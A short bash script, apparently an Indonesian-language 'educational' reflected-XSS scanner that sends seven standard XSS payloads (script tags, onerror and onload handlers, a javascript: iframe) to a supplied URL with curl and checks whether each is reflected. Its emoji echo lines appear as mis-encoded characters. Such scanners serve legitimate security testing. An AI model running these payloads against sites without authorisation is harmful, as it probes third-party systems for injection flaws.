#!/bin/bash
# =====================================
#  XSS Scanner Mini (Educational Only)
#  Author : d4nu-ghost
#  NOTE   : Gunakan hanya di lab / target legal (bug bounty, test sendiri)
# =====================================

if [ $# -ne 1 ]; then
  echo "Usage: $0 <url-with-parameter>"
  echo "Example: $0 'http://127.0.0.1/vuln.php?q='"
  exit 1
fi

URL=$1

# Koleksi payload dasar
PAYLOADS=(
  "<script>alert(1)</script>"
  "\"><script>alert(1)</script>"
  "'\"><img src=x onerror=alert(1)>"
  "<svg/onload=alert(1)>"
  "<body onload=alert(1)>"
  "';alert(1);//"
  "<iframe src=javascript:alert(1)>"
)

echo "üéØ Target: $URL"
echo "‚ö° Mulai scanning XSS..."
echo ""

for p in "${PAYLOADS[@]}"; do
  echo "üîπ Testing payload: $p"
  RESPONSE=$(curl -s -L "${URL}${p}")

  if echo "$RESPONSE" | grep -q "$p"; then
    echo "‚úÖ POTENSI XSS dengan payload: $p"
  else
    echo "‚ùå Tidak refleksi."
  fi
  echo "----------------------------------"
done

echo "üéâ Selesai scanning."
